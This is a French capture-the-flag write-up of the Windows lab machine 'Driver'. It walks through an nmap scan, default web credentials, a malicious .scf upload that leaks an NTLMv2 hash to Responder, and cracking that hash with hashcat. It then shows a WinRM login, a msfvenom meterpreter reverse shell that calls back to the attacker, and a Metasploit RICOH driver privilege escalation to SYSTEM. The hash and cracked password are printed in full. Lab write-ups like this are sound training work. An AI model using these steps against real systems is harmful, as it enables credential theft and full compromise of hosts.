# Driver - Easy

```bash
PORT    STATE SERVICE      VERSION
80/tcp  open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc        Microsoft Windows RPC
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-03-21T23:09:17
|_  start_date: 2023-03-21T23:08:08
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h00m18s, deviation: 0s, median: 1h00m18s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.28 seconds
```

On se rend sur le port 80. Le mot de passe est admin pour le compte admin, sûrement des creds par défaut du coup. On lance un gobuster en tâche de fond. Sur le site on peut upload des drivers pour des machines. On va tester d’upload un .php. Trop facile, ça ne marche pas donc on va essayer de faire un driver malveillant ou upload un autre fichier. Les fichiers .scf (Shell Command File) s’executent dès l’ouverture donc on va en profiter pour essayer de gagner l’accès. On utilisera Responder avec pour intercepter.

```bash
cat exploit.scf 
[Shell]
Command=2
IconFile=\\10.10.16.6:8000\tools\nc.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
sudo responder -I tun0
```

Et on upload le .scf, on obtient alors le hash:

```bash
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:03ca24cd885fedfc:582DEAF3E7EB5E09BE3B771861C412EE:010100000000000080E6083C225CD9018CCD5168689C50C5000000000200080038004C004500370001001E00570049004E002D00390058004F003700320058004A00440048004E00500004003400570049004E002D00390058004F003700320058004A00440048004E0050002E0038004C00450037002E004C004F00430041004C000300140038004C00450037002E004C004F00430041004C000500140038004C00450037002E004C004F00430041004C000700080080E6083C225CD901060004000200000008003000300000000000000000000000002000007F37719A37130AEA02787CA48AD64BBFAAFD97868C4EEA97ABF2CB7A52F9DB900A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003600000000000000000000000000
```

On va le cracker avec hashcat.

```bash
hashcat --force tony.hash -m 5600 /usr/share/wordlists/rockyou.txt

liltony
```

```bash
crackmapexec winrm 10.10.11.106 -u tony -p liltony

evil-winrm -i 10.10.11.106 -u tony -p liltony
```

On upload winpeas et après execution il y a un driver de printer intéressant nommé RICOH qui pourrait être exploité via metasploit. On va upload une session metasploit pour pouvoir run directement l’exploit

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.6 LPORT=9999 -f exe > shell.exe
sudo msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost tun0
set lport 9999
```

Sur le winrm:

```bash
upload shell.exe C:\Users\tony\Documents
.\shell.exe
migrate -N explorer.exe
(on met la session en background avec ctrl+z)
use exploit/windows/local/ricoh_driver_privesc
set payload windows/x64/meterpreter/reverse_tcp
set session 1
set lhost tun0
run
```

On obtient un shell en tant qu’autorité système et donc le flag